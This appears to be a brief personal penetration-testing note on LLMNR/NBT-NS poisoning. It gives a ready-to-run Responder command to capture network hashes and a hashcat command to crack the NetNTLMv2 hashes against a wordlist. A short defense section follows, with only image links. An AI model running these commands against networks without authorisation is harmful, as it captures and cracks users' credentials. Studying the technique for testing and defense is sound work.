### Responder
LLMNR & NetBios (NBT-NS) Poisoner

`responder -I wlp59s0 -rdw -v`

![[Pasted image 20221202133849.png]]

\n
### Hashcat
Crack hashes

`hashcat -m 5600 hash.txt rockyou.txt`
- where `-m` is the module (`hashcat --help | grep LLMNR`)

### Defense
Disable LLMNR
![[Pasted image 20221202134958.png]]

Require Access Control
![[Pasted image 20221202135024.png]]